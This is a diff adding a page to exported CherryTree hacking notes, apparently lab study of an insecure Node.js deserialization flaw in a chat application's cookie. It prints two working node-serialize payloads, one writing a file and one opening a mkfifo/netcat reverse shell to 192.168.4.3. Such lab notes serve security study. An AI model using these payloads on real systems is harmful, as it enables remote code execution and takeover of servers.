@@ -1,11 +1,11 @@
 <!doctype html><html>
 <head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>secnotes.ctb</title>
+  <title>Deserialization</title>
   <meta name="generator" content="CherryTree">
   <link rel="stylesheet" href="styles.css" type="text/css" />
 </head>
-<body><div class="tree">
+<body><div class="main"><div class="tree">
 <p><strong>Index</strong></p>
 <p><a href="Hacker-playbook--Webapps-attack.html">Webapps-attack</a></p>
 
@@ -50,4 +50,5 @@
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--lab.html">lab</a></li>
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--Advanced_XXE_OOB.html">Advanced XXE OOB</a></li>
 </ol></ol></div>
+<div class="page"><h1><b><u>Deserialization</u></b></h1><br /><br />In the chat application, the cookie is encoded and use a serialization function on the server side.<br /><br /><br /><img src="images/680-1.png" alt="images/680-1.png" /><br /><br />The source code reveals that the eval() function is used with allow to execute raw javascript.<br /><br /><img src="images/680-2.png" alt="images/680-2.png" /><br /><br /><br />Using the Immediately invoked function express (IFFE ----- say iffy)<br />we are able to remote code execution on the server<br /><a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression">https://en.wikipedia.org/wiki/Immediately-invoked_function_expression</a><br /><br /><br /><br />{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('echo nyws is cool &gt; /opt/web/chatSupportSystems/public/nyws.txt', function(error, stdout, stderr) { console.log(stdout) });}()"}<br /><br /><br /><br /><strong>{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.4.3 8888 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()"}</strong><br /><br /><br />encode in base64 and replayed using burp leads to RCE and thus revershe shell :<br /><br /><br /><img src="images/680-3.png" alt="images/680-3.png" /><br /><br /><br /><br /><img src="images/680-4.png" alt="images/680-4.png" /><br /><br /></div></div>
 </body></html>
